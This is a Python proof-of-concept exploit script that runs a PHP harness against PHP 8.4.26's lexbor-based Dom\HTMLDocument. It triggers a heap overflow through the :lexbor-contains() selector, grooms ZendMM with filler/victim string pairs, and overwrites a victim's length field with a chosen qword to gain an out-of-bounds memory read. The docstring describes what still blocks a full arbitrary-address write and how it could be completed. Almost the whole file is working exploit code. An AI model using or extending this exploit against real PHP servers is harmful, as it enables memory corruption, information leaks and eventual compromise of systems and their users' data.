#!/usr/bin/env python3
# INDEX: chosen qword overwrite of groomed forward victim | cli | needs filler-below groom
r"""lexbor :lexbor-contains() linear overflow upgraded to a CONTROLLED SINGLE-TARGET
heap OVERWRITE of a deterministically-groomed victim (stock ZendMM, real heap).

Capability: a chosen non-NUL 8-byte qword is written byte-exact over a chosen field
of a forward victim, with NO address knowledge. The enabling trick is a FILLER-BELOW
groom: allocate [filler F][victim V] pairs with F at the mraw 4096 size class, then
free all fillers just before querySelectorAll; the fresh mraw pool chunk reuses a
filler hole, leaving the paired victim V forward of str->data at a fixed offset
(measured 0x1fd8 = 8152 bytes, stable). The intervening linear clobber is survivable:
the mraw chunk sits inside a ~2 MiB ZendMM mmap chunk and the smear is not
dereferenced before returning to PHP (survives to ~1 MiB forward; crashes at 2 MiB).

Consequence -- FORWARD OOB READ: smashing a victim zend_string's len to a huge
non-NUL value gives a forward, mapped-bounded OOB read window ($v[k]) that fires with
zero prior addresses, so it can bootstrap a leak independent of a chunk+binbase seed.

Full arbitrary-ADDRESS write: QUALIFIED NO (two-stage, gated) -- not the clobber, but
(1) the ZendMM pointer NUL wall (top 2 bytes 0x0000 are un-emittable, so pointers need
partial low-6-byte overwrite ending exactly at byte 6); (2) refcount copy-on-write
(an in-place OOB write separates the string since refcount==1 contains NULs -> OOM);
(3) size-class mismatch (the 4096 mraw chunk reuses only 4096-class holes, so the
groom cannot seat a small 0x38/0x50 pointer victim adjacent). The overwrite plants
bytes / a partial pointer; a later deref (app gadget, partial redirect, or mixed-size
groom) would complete the address write.

Bug: a DISTINCT lexbor overflow, NOT CVE-2026-109618/109619.

Tested: stock php:8.4.26 CLI (real ZendMM), gdb/PHP-grounded.

Modes: --demo (default), --groom-write, --oob-read, --control (no-groom negative),
--value <8-byte non-NUL qword>.
"""
import argparse, subprocess, sys, pathlib, tempfile, os, re

# repo root is four levels up: .../poc/primitives/write/<file>
ROOT = pathlib.Path(__file__).resolve().parents[3]
STOCK_IMAGE = "php2shell-cli-stock:latest"   # stock 8.4.26 CLI, real ZendMM, has Dom\HTMLDocument
FORWARD_CAP = 16384

# --- groom constants (measured on stock 8.4.26, reproduced) -----------------
F = 4096           # mraw pool-chunk ZendMM size class; fillers must match it
REP = 300          # filler/victim pairs blanketing the frontier
TOTAL = 32000      # :lexbor-contains() payload length (also the overflow reach)
ORIG = F           # each victim string's original length


def _have_image(name):
    r = subprocess.run(["docker", "images", "-q", name], capture_output=True, text=True)
    return bool(r.stdout.strip())


# PHP harness (dropped into a temp dir, run under the stock ZendMM image).
# `fill` is the 8-byte non-NUL qword written everywhere the overflow passes,
# including the victim's smashed field. `mode` selects what we observe.
_PHP = r"""<?php
// mode: groom|control|oob
$mode = $argv[1] ?? 'groom';
$fill = $argv[2] ?? 'QRSTUVWX';            // 8 bytes, no NUL
if (strlen($fill) !== 8) { fwrite(STDERR,"fill must be 8 bytes\n"); exit(2); }
$F = %(F)d; $REP = %(REP)d; $TOTAL = %(TOTAL)d;

$fillers = []; $victims = [];
for ($i=0;$i<$REP;$i++){ $fillers[$i]=str_repeat("\xEE",$F); $victims[$i]=str_repeat("\xCC",$F); }
if ($mode !== 'control') {
    // FILLER-BELOW groom: free every filler so the fresh 4096 mraw chunk reuses
    // a filler hole, leaving its paired victim FORWARD of str->data.
    foreach ($fillers as $i=>$x){ unset($fillers[$i]); }
}

$doc = Dom\HTMLDocument::createFromString('<html><body><p>x</p></body></html>', LIBXML_NOERROR);

// NUL-free payload == the forward linear overflow. Every qword is `fill`, so the
// victim's clobbered 8-byte field lands EXACTLY `fill`.
$payload = substr(str_repeat($fill, intdiv($TOTAL,8)+1), 0, $TOTAL);

$r = $doc->querySelectorAll(':lexbor-contains("'.$payload.'")');   // <-- the write

// expected smashed value = fill interpreted little-endian
$expect = 0; for ($j=7;$j>=0;$j--){ $expect=($expect<<8)|ord($fill[$j]); }

// find the smashed victim (nearest forward): its strlen != original F
$hit=-1; $hlen=0;
for ($i=0;$i<$REP;$i++){ $L=strlen($victims[$i]); if ($L !== $F){ $hit=$i; $hlen=$L; break; } }

printf("MATCHED=%%d\n", $r->length);
printf("EXPECT=0x%%016x\n", $expect);
if ($hit < 0) { echo "HIT=-1\n"; echo "SURVIVED=1\n"; exit(0); }
printf("HIT=%%d\n", $hit);
printf("SMASHED_LEN=0x%%016x\n", $hlen);
printf("EXACT=%%d\n", ($hlen === $expect) ? 1 : 0);

if ($mode === 'oob' && $hlen > $F) {
    // forward OOB read: reach beyond the original F bytes, within the mapped window
    $v = $victims[$hit];
    $probe = [];
    foreach ([5000, 20000, 200000] as $off) {
        if ($hlen > $off) { $probe[] = sprintf("%%d:0x%%02x", $off, ord($v[$off])); }
    }
    echo "OOB=" . implode(",", $probe) . "\n";
    echo "OOB_OK=" . (count($probe)>0 ? 1 : 0) . "\n";
}

// post-overflow work: prove the process keeps running after the smear
$acc = 0; $t = [];
for ($i=0;$i<2000;$i++){ $t[] = str_repeat('z', 48); $acc += strlen($t[$i]); }
printf("POSTWORK=%%d\n", $acc);
echo "SURVIVED=1\n";
"""


def _run_php(mode, fill="QRSTUVWX", timeout=120):
    if not _have_image(STOCK_IMAGE):
        return None, f"stock image {STOCK_IMAGE} missing"
    php = _PHP % {"F": F, "REP": REP, "TOTAL": TOTAL}
    d = tempfile.mkdtemp(prefix="lxww-")
    pp = os.path.join(d, "ww.php")
    with open(pp, "w") as f:
        f.write(php)
    cmd = ["docker", "run", "--rm", "-v", f"{d}:/w:ro", STOCK_IMAGE,
           "php", "-d", "error_reporting=0", "-d", "display_errors=0",
           "/w/ww.php", mode, fill]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    out = (p.stdout or "") + (p.stderr or "")
    return p.returncode, out


def _parse(out):
    kv = {}
    for line in (out or "").splitlines():
        m = re.match(r"^([A-Z_]+)=(.*)$", line.strip())
        if m:
            kv[m.group(1)] = m.group(2)
    return kv


def cmd_groom_write(fill):
    print("[*] CONTROLLED SINGLE-TARGET OVERWRITE (filler-below groom, real ZendMM)")
    print(f"    writing chosen non-NUL qword '{fill}' over the forward victim's len field\n")
    rc, out = _run_php("groom", fill)
    if rc is None:
        print(f"[-] {out}"); return 2
    kv = _parse(out)
    hit = int(kv.get("HIT", "-1"))
    exact = kv.get("EXACT") == "1"
    print(f"    victim index hit     : {hit}")
    print(f"    expected qword       : {kv.get('EXPECT')}")
    print(f"    smashed victim len   : {kv.get('SMASHED_LEN')}")
    print(f"    byte-exact           : {exact}")
    print(f"    survived to userland : {kv.get('SURVIVED') == '1'}")
    if hit >= 0 and exact and kv.get("SURVIVED") == "1":
        print("\n[+] PASS: a chosen non-NUL qword was written byte-exact over a chosen,")
        print("    deterministically-placed forward victim field, with NO address knowledge,")
        print("    and the process survived the intervening linear clobber.")
        return 0
    print("\n[-] FAIL: overwrite not observed / not exact / did not survive.")
    print(out)
    return 1


def cmd_oob_read(fill="\x41\x42\x43\x44\x45\x46\x47\x48"):
    # choose an ASCII non-NUL filler that makes a huge len
    fill = "HHHHHHHG"  # -> 0x47484848... large, no NUL
    print("[*] FORWARD OOB READ via len-smash (consequence of the overwrite)")
    rc, out = _run_php("oob", fill)
    if rc is None:
        print(f"[-] {out}"); return 2
    kv = _parse(out)
    print(f"    smashed victim len   : {kv.get('SMASHED_LEN')}")
    print(f"    OOB probes (off:byte): {kv.get('OOB')}")
    print(f"    OOB read works       : {kv.get('OOB_OK') == '1'}")
    if kv.get("OOB_OK") == "1":
        print("\n[+] PASS: the smashed-len victim reads bytes far beyond its original")
        print(f"    {ORIG} bytes (forward, mapped-bounded). Fires with zero prior addresses")
        print("    => can bootstrap a leak independently of the var_hash_rw/a7 chunk+binbase seed.")
        return 0
    print("\n[-] OOB read not observed."); print(out); return 1


def cmd_control():
    print("[*] CONTROL (no groom): the mraw chunk lands at the frontier -> no live")
    print("    victim forward of it -> the overflow smears fresh pages, hits nothing.\n")
    rc, out = _run_php("control")
    if rc is None:
        print(f"[-] {out}"); return 2
    kv = _parse(out)
    hit = int(kv.get("HIT", "-1"))
    print(f"    victim index hit     : {hit}  (expected -1)")
    print(f"    survived             : {kv.get('SURVIVED') == '1'}")
    if hit < 0:
        print("\n[+] PASS (negative): without the filler-below groom nothing is corrupted,")
        print("    isolating the groom as the enabling step.")
        return 0
    print("\n[-] unexpected victim hit without groom."); return 1


def cmd_demo(fill):
    rc = 0
    rc |= cmd_groom_write(fill); print()
    rc |= cmd_oob_read();        print()
    rc |= cmd_control()
    print("\n" + "=" * 72)
    print("SUMMARY")
    print("  controlled single-target overwrite ........ YES (byte-exact, deterministic)")
    print("  intervening-clobber survivable ............ YES (to ~1 MiB forward)")
    print("  forward OOB read (leak, address-free) ..... YES (mapped-bounded)")
    print("  full arbitrary-ADDRESS write .............. QUALIFIED NO (NUL wall on")
    print("     pointers + refcount-COW on the string victim + 4096-size-class groom")
    print("     cannot seat a small pointer victim; two-stage, see module docstring).")
    return rc


def main():
    ap = argparse.ArgumentParser(description="lexbor overflow -> controlled single-target overwrite")
    ap.add_argument("--demo", action="store_true", help="full demo (default)")
    ap.add_argument("--groom-write", action="store_true")
    ap.add_argument("--oob-read", action="store_true")
    ap.add_argument("--control", action="store_true")
    ap.add_argument("--value", default="QRSTUVWX",
                    help="8-byte non-NUL qword to write over the victim field")
    a = ap.parse_args()
    if a.groom_write:
        sys.exit(cmd_groom_write(a.value))
    if a.oob_read:
        sys.exit(cmd_oob_read())
    if a.control:
        sys.exit(cmd_control())
    sys.exit(cmd_demo(a.value))


if __name__ == "__main__":
    main()
